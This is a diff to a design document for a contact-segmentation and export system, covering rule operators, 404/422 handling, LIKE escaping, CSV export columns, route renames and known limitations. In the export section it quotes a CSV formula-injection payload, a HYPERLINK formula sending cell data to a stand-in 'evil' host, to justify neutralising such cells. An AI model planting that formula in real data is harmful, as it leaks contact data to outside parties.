@@ -103,7 +103,10 @@ segments keep working; a new rule cannot name one.
 **A field resolves to a fixed SQL fragment chosen by a match on this table.** The compiler has no
 branch that writes a caller-supplied identifier.
 
-**An unresolvable `segment_id` is refused on every path that accepts one** — segment CRUD, the
+**An unresolvable `segment_id` is a `404` on every path that accepts one** — not a `422`. A
+missing field name is a malformed document; a missing segment is a missing resource, and tenancy
+requires 404 rather than anything that distinguishes "not yours" from "not there". Decided once
+in `load_rules`, never per path. The paths are segment CRUD, the
 contacts grid, bulk selection and export. A deleted or cross-workspace segment must not degrade
 to "no rules".
 
@@ -113,9 +116,20 @@ to "no rules".
 - **number:** `eq`, `neq`, `gt`, `gte`, `lt`, `lte`, `is_set`, `is_not_set`
 - **date / datetime:** `before`, `after`, `on`, `in_last_days`, `is_set`, `is_not_set`
 - **boolean:** `is_true`, `is_false`, `is_set`, `is_not_set`
+- **select:** `eq`, `neq`, `is_set`, `is_not_set`
+- **multi_select:** `has_any`, `has_none`, `is_set`, `is_not_set`
 - **list:** `member_of`, `not_member_of`, each with optional `status`
 - **tag:** `has`, `not_has`
 - **suppressed:** `is_true`, `is_false`
+
+A `multi_select` stores a JSON array, so `->>` text comparison is meaningless on it: `has_any`
+and `has_none` compile through `jsonb`'s `?|` (`jsonb_exists_any`) against the array's elements,
+with `has_none` also matching an absent or NULL key. A multi_select that can only be tested for
+presence is a field nobody can segment on, which defeats the point of having typed custom fields.
+
+**Values on `contains`, `starts_with` and `ends_with` must have `%`, `_` and `\` escaped**, with
+an explicit `ESCAPE` clause. Unescaped, a user searching for `50%` matches every row — the same
+"matches everything" shape as an empty rule set, arriving through a value rather than a document.
 
 An operator outside its kind's set is `422`. Casting follows the **definition's** kind —
 `(attributes ->> $n)::numeric` — safe only because `validate_attributes` enforces the type on
@@ -145,6 +159,15 @@ every contact whose timezone is NULL. Negative text operators compile to
 
 Reviewer check: **a contact with zero related rows, or a NULL/absent value, matches every
 negative operator.**
+
+**That rule is about negations of positive operators** — `not_has`, `not_member_of`,
+`not_contains`, `neq` — and not about `is_false`. `is_false` is one arm of a four-way partition
+with `is_true`, `is_set` and `is_not_set`, so on a boolean **attribute** it means *stored false*,
+and a contact with the key absent does **not** match. The reverse stays expressible as a group of
+`any[is_false, is_not_set]`, whereas folding absence into `is_false` would make "stored false"
+unaskable. `suppressed is_false` keeps meaning "no blocking suppression", which is not an
+inconsistency: a boolean attribute is three-valued (true, false, absent) while `suppressed` is
+computed and cannot be unset.
 
 ### 4.6 Engagement rules are reserved
 
@@ -244,7 +267,7 @@ create table selection_snapshots (
   id uuid primary key,                -- UUIDv7: carries its own issue time, see §8.5
   workspace_id uuid not null references workspaces(id) on delete cascade,
   created_by uuid references users(id) on delete set null,
-  filter jsonb not null,              -- the predicate, for the audit row; `q` redacted, see §8.7
+  filter jsonb not null,              -- the predicate as sent; redaction is the audit copy's, §8.7
   size bigint not null,
   created_at timestamptz not null default now(),
   expires_at timestamptz not null,
@@ -493,9 +516,21 @@ Cheap now, so it is done now.
 - Columns: the contact's own fields, every live custom field, `lists` and `tags` as
   semicolon-joined names, and `suppressed`.
 - **CSV formula injection is neutralised.** Any cell whose first character is `=`, `+`, `-`, `@`,
-  tab or CR is prefixed with a single quote. Without it, a `first_name` of
-  `=HYPERLINK("http://evil/?x="&A1,"click")` — settable through any signup form — executes when an
-  admin opens the export of the whole contact list. Pinned by a test.
+  tab or CR is prefixed with a single quote, **unless the whole cell parses as a finite number**.
+  Without it, a `first_name` of `=HYPERLINK("http://evil/?x="&A1,"click")` — settable through any
+  signup form — executes when an admin opens the export of the whole contact list. Pinned by a
+  test.
+
+  The numeric exception exists because `-5` is a number, not a formula, and prefixing it exports
+  a number field as the text `'-5`, which the M1c importer would read back wrong. `-5-5` does not
+  parse as a number and is still prefixed, so nothing that Excel would evaluate escapes. Data
+  fidelity and injection safety do not actually conflict here; treating them as if they did
+  corrupts every negative number in the file.
+
+- **The `lists` column carries each membership's status**, as `name:status` pairs, not bare names.
+  A membership without its status is not the data: an export listing an `unsubscribed` member
+  indistinguishably from a `subscribed` one is a re-subscription waiting for M1c's importer to
+  read it back. `tags` stay bare names, having no status.
 - **Audited**: actor, filter, row count; `q` is not recorded, for §8.7's reason.
 - `Role::Admin`. Stated honestly: this does not prevent exfiltration — an editor can already page
   the book out 100 rows at a time — it raises the cost and creates one audit point where there was
@@ -509,8 +544,15 @@ The route sets a membership to `unsubscribed` and keeps the row, while everythin
 named `remove`. Renamed before any external client exists:
 
 - `DELETE /lists/{id}/members/{contact_id}` → `POST /lists/{list_id}/members/{contact_id}/unsubscribe`
-- `remove_list_member` → `unsubscribe_list_member`; `remove_member` → `unsubscribe_member`
+- `DELETE /contacts/{id}/lists/{list_id}` → `POST /contacts/{contact_id}/lists/{list_id}/unsubscribe`
+- `remove_list_member` → `unsubscribe_list_member`; `remove_member` → `unsubscribe_member`;
+  `remove_contact_from_list` → `unsubscribe_contact_from_list`
 - audit action `LIST_MEMBER_REMOVED` → `LIST_MEMBER_UNSUBSCRIBED`
+
+**Both routes, not one.** The contact-side route does the same thing under the same wrong name,
+issue `08`'s own table lists it first, and it is the one the UI actually calls. Renaming half of a
+pair leaves two routes performing one operation under two names and two verbs, which is worse
+than either state — the same argument that closed M1a's two drifted axe helpers.
 
 **Existing audit rows keep the old string.** Rewriting history makes the audit log a worse record
 than it was. The glossary carries both, noting which superseded which.
@@ -644,7 +686,7 @@ SQL copy breaks the segment compiler, not merely the import.
   `contacts` survives; shown to fail if any value is interpolated.
 - **Empty rules** refused at parse, save and preview, plus a structural test that compiled SQL
   always carries a restriction beyond `workspace_id`.
-- **Unknown field, and unresolvable `segment_id`,** are 422 on every path that accepts one —
+- **An unknown field is 422 and an unresolvable `segment_id` is 404,** on every path that accepts one —
   including the grid and export, not only segment CRUD.
 - **Negation over absence and NULL.** For every negative operator: zero related rows matches, and
   a NULL column value matches.
@@ -696,5 +738,16 @@ already fail the build on a regression.
 - Segment counts in the list view are N queries for N segments. The lateral-join fix is worth
   doing only if it measures badly.
 - The one-hour snapshot TTL is a guess. Nobody has watched a real operator work a bulk action.
+- **`on` for a datetime compares calendar days in the server's timezone.** Dev and CI are UTC, so
+  a Postgres running in a local zone shifts the result by its offset. Contacts carry their own
+  `timezone`, which is the obvious thing to honour; M2's scheduling work meets the same question
+  and should settle both at once.
+- **`is_set` means slightly different things per kind.** On a text field it treats `''` as unset,
+  because `first_name` and `last_name` are `not null default ''` and a plain NULL test would make
+  the operator useless on two of the five text fields. Deliberate, and worth stating because a
+  reader will otherwise find it by surprise.
+- **`Rule` and `Group` have public fields.** A caller that hand-builds one rather than going
+  through `Group::parse` can reach an `unreachable!` — a panic, not a `422`. Nothing outside
+  `rules.rs` does today. Seal the constructors before any task synthesises a rule.
 - No segment is consumed by anything until M2, where §4.7's intersection with
   `mailable_list_members` gets built and tested.
